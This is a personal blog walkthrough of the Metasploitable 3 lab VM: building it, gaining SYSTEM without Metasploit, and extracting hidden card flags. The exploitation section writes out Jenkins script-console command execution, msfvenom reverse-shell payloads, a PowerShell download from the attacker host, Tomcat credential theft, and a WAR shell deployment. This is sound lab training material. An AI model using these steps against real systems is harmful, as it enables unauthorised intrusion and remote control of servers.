---
layout: post
title: Metasploitable 3 and Flags
tags: [CTF, Security]
---
I have recently completed [With You With Me](https://www.withyouwithme.com.au/)'s Penetration Testing course. In that course, they utilised Metasploitable 2 as the basis to conduct training. As you will see from my Blog, I have completed quite a few Vulnhub VM's and am comfortable with exploiting a Linux System and Metasploitable 2 is now quite old. As a result of this I have been wanting to further development my Windows exploitation skills and although I have been completing all Windows boxes on [Hack the Box](https://www.hackthebox.eu/), I wanted something I can do when I don't have an internet connection - Enter Metasploitable 3. 

Metasploitable 3 is the last VM from Rapid 7 and is based on Windows Server 2008. What makes Metasploitable 3 far more interesting than Metasploitable 2 is the inclusion of flags to capture. This blog post will cover how I was able to build Metasploitable 3, a quick walkthrough of how to gain System without Metasploit and how to obtain the hidden flags. 

## Installation
I originally, did not want to cover installation as there are numerous posts floating around the internet covering it. However, I ran into a few issues along the way and hopefully what I learnt to assist others. Unlike Metasploitable 2, Metasploitable 3 must be built utilisng Packer and Vagrant and a provider of your choice (Virtual Box or VMWare). The requirements for Metasploitable 3 are listed on the [github repository](https://github.com/rapid7/metasploitable3). 

Inside a Ubuntu VM, I utilised Packer v1.0.0 and Vagrant 1.9.1 with Virtuable Box 5.2.8. Utilising the bash script in the Git repository I was able to successfully build Metasploitable 3. However, this was built for VirtualBox and exporting the VM to VMware did not work. I therefore needed to build it for VMWare as that is what I use day to day. I was unable to build for VMWare inside my Ubuntu VM. I was however able to successfully build the .box file utilising [packer v1.2.2](https://releases.hashicorp.com/packer/1.2.2/packer_1.2.2_windows_amd64.zip) and my installation of VMWare Workstation 14. I was unable to use Vagrant successfully as I also needed VMWare Fusion (which I do not have). However, with Packer v1.2.2 I was able to create a .box file with everything inside. I simply unzipped the .box file a few times to get the VMWare files and then imported that into VMWare Workstation.

## Explioitation
Now, being called Metasploitable the idea is to use Metasploit to exploit the box. This seems a bit too easy for my liking, so I detail how I gained system without using Metasploit.

Running nmap on the box reveals a plethora of services available to us. 
{% highlight bash %}
PORT      STATE SERVICE              VERSION
22/tcp    open  ssh                  OpenSSH 7.1 (protocol 2.0)
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1617/tcp  open  rmiregistry          Java RMI
3000/tcp  open  http                 WEBrick httpd 1.3.1 (Ruby 2.3.3 (2016-11-21))
3306/tcp  open  mysql                MySQL 5.5.20-log
3389/tcp  open  tcpwrapped
3700/tcp  open  giop                 CORBA naming service
3820/tcp  open  ssl/giop             CORBA naming service
3920/tcp  open  ssl/exasoftport1?
4848/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7676/tcp  open  java-message-service Java Message Service 301
8009/tcp  open  ajp13                Apache Jserv (Protocol v1.3)
8019/tcp  open  qbdb?
8020/tcp  open  http                 Apache httpd
8022/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
8027/tcp  open  unknown
8028/tcp  open  postgresql           PostgreSQL DB
8031/tcp  open  ssl/unknown
8032/tcp  open  desktop-central      ManageEngine Desktop Central DesktopCentralServer
8080/tcp  open  http                 Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
8181/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
8282/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
8383/tcp  open  ssl/http             Apache httpd
8443/tcp  open  ssl/https-alt?
8444/tcp  open  desktop-central      ManageEngine Desktop Central DesktopCentralServer
8484/tcp  open  http                 Jetty winstone-2.8
8585/tcp  open  http                 Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
8686/tcp  open  rmiregistry          Java RMI
9200/tcp  open  elasticsearch        Elastic elasticsearch 1.1.1
9300/tcp  open  vrace?
47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc                Microsoft Windows RPC
49153/tcp open  msrpc                Microsoft Windows RPC
49154/tcp open  msrpc                Microsoft Windows RPC
49158/tcp open  msrpc                Microsoft Windows RPC
49178/tcp open  unknown
49179/tcp open  rmiregistry          Java RMI
49180/tcp open  tcpwrapped
49185/tcp open  msrpc                Microsoft Windows RPC
49245/tcp open  msrpc                Microsoft Windows RPC
49258/tcp open  ssh                  Apache Mina sshd 0.8.0 (protocol 2.0)
49259/tcp open  jenkins-listener     Jenkins TcpSlaveAgentListener
49294/tcp open  rmiregistry          Java RMI
49297/tcp open  unknown
49298/tcp open  unknown
49299/tcp open  unknown
{% endhighlight %}

As you can see, this would be a very long blog post if I was to detail all of the possible vectors that are available on this box. There are a large number of web services running and browsing through them I came across a Jenkins v1.637 installation running on port 8484. Browsing to the page - http://192.168.206.135:8484/script, I find that I can enter arbitary groovy script into a console. From here I should be able to execute commands on the box. I test this by entering the following into the Script Console:
{% highlight bash %}
println new ProcessBuilder("cmd.exe", "/C whoami").redirectErrorStream(true).start().text
{% endhighlight %}
This produced the following result, confirming code execution.
![](/img/msf3/jenkins1.png)

I then generated a payload in msfvenom by using:
{% highlight bash %}
msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.206.133 LPORT=443 > payload.exe
{% endhighlight %}
I then downloaded the payload onto the machine by entering the following into the Jenkins Script Console:
{% highlight bash %}
println new ProcessBuilder("powershell.exe", "Invoke-WebRequest -Uri 'http://192.168.206.133:8000/payload.exe' -OutFile 'C:\\Program Files\\jenkins\\Scripts\\payload.exe'").redirectErrorStream(true).start().text
{% endhighlight %}
I then set up my listener with netcat and caught the shell after triggering the payload by entering the following into the Jenkins Script Console:
{% highlight bash %}
println new ProcessBuilder("payload.exe").redirectErrorStream(true).start().text
{% endhighlight %}

Now, I had a shell it was time to escalate my privileges. I noted from the nmap scan earlier that Apache Tomcat was running and in some configurations this is run as NT Authority\System. I browsed to C:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33\conf and viewed the file tomcat-users.xml to obtain some credentials. This revealed the username and password to be "sploit/sploit"

![](/img/msf3/shell.png)
![](/img/msf3/creds.png)

I then browsed to the Tomcat installation at http://192.168.206.135:8282 and logged in. With the level of access I had, I have the ability to upload a .WAR package that will be deployed. I generate a .WAR payload using msfvenom using:
{% highlight bash %}
msfvenom -p windows/x64/shell_reverse_tcp -f war LHOST=192.168.206.133 LPORT=80 > payload.war
{% endhighlight %}
Once the payload has been uploaded, it will appear in the list of installed applications. To trigger the payload you need to browse to the .jsp page that is created. To find out the page name, you need to unjar your .WAR file:
{% highlight bash %}
jar -xvf payload.war
{% endhighlight %}
This will unjar the .WAR file and you can see the name of the .jsp page. Then browse to the page via http://192.168.206.135:8282/payload/uayhmjwv.jsp to trigger the payload.

![](/img/msf3/system.png)

We are now NT Authority\System and lets get hunting for flags!

## Flags
There are a total of 15 flags hidden inside of Metasploitable 3. Back in 2016 Rapid 7 held a [Capture the Flag]() competition, however we have missed the boat so we are doing this for our own fun! The flags are based on a deck of cards and they are not just simply files sitting on the machine. The flags are obscured and hidden inside of files and some additional techniques are required to obtain the flags.

### Jack of Clubs
Once you have System, simply navigate to C:\Windows\System32 and the .png file is sitting right there for you. 
![](/img/msf3/jackofclubs.png)

### King of Diamonds
The King of Diamonds can be found two ways - By navigating with your browser to http://192.168.206.135:8585/wordpress/wp-content/uploads/2016/09/ and downloading the file. This is all because the WordPress uploads directory has directory listing available. Or, if you have a shell - navigate to C:\wamp\www\wordpress\wp-content\uploads\2016\09 and transfer the file.

### Jack of Hearts
The Jack of Hearts is found in C:\Users\Public\Documents. The file is a .docx file. Simply unzip the file and navigate to the unzip word/media directory to get the .png file.
![](/img/msf3/jackofhearts.png)

### Seven of Spades
The Seven of Spades is located at C:\Users\Public\Documents. It is a .pdf file. To extract the flag you need to use pdfimages.
{% highlight bash %}
pdfimages -png seven_of_spades.pdf ~/Metasploitable-Flags/
{% endhighlight %}
![](/img/msf3/sevenofspades.png)

### Ace of Hearts
The Ace of Hearts is found at C:\Users\Public\Pictures. It is a .jpg, however all the other flags are .png and also the .jpg flag doesn't look like the rest. Using binwalk on the file, you will notice that there is a zip file hidden inside. I copied the file and added a .zip extension and then simply unzipped the file to reveal the flag.
![](/img/msf3/aceofhearts.png)

### Jack of Diamonds
The Jack of Diamonds is found at C:\. When you inspect the file, you will notice that it is a 0 byte file. The flag is hidden inside an alternate data stream. 
![](/img/msf3/jackofdiamonds.png)
In order to view the alternate data stream use the following:
{% highlight bash %}
powershell -c get-content -Path C:\jack_of_diamonds.png -Stream jack_of_diamonds.txt
{% endhighlight %}
You will notice that it looks like base64. Pipe the alternate data stream into another file and then transfer that to your attacking machine. I added the extra '==' to the end of the Base64 string and then decoded it into a png to reveal the flag.
{% highlight bash %}
cat jack_of_diamonds.b64 | base64 --decode > jack_of_diamonds.png
{% endhighlight %}
![](/img/msf3/jackofdiamonds2.png)

### Four of Clubs
The Four of Clubs is found in C:\Users\Public\Music. The file is a .wav, however using binwalk on the file reveals it to have a .png hidden inside. To extract the .png I simply used a tool called [foremost](https://wiki.archlinux.org/index.php/Foremost) to extract the image.
![](/img/msf3/fourofclubs.png)

### Ten of Diamonds
The Ten of Diamonds is found in C:\Users\Public\Pictures. The file a .png file, however it cannot be viewed. Looking at the file with binwalk we can see the compressed component of the image, however there is no PNG header. Opening the file in hexeditor I can see that the letters PNG have been replaced with MSF. I change these bytes to '50 4e 47' which provides me with the PNG header. I save the file and view the flag.
![](/img/msf3/tenofdiamonds1.png)
![](/img/msf3/tenofdiamonds.png)

### Queen of Hearts
The Queen of Hearts flag is found by browsing the MySQL installation on port 3306. Using the username 'root' and no passowrd I was able to navigate through to find the database 'cards' and the table 'queen_of_hearts'. The first entry in the table contacts base64 encoded text. I copied this to my attacking machine and decoded. However, there must be something wrong with the base64 string as the flag appears to be broken.
![](/img/msf3/queenofhearts.png)

### Three of Spades.
The Three of Spades is found in C:\Windows and is a .png file. However the file does not display. Further Work is needed to decode this flag. To Be Completed.

### King of Clubs
The King of Clubs is found in C:\Windows\System32 and is a windows PE executable. This flag requires binary analysis to be conducted in order to decode the flag. To Be Completed.

## Conclusion....for now.
After much searching, I was struggling to find any more flags. After a bit of googling, it appears my advice earlier to ignore using vagrant is the issue. The Vagrant component of the build will complete the installation and include other services such as an IIS server and FTP and more flags! For now, this will do. This blog post is long enough - Look out for a part 2 once I get my Metasploitable build fixed!
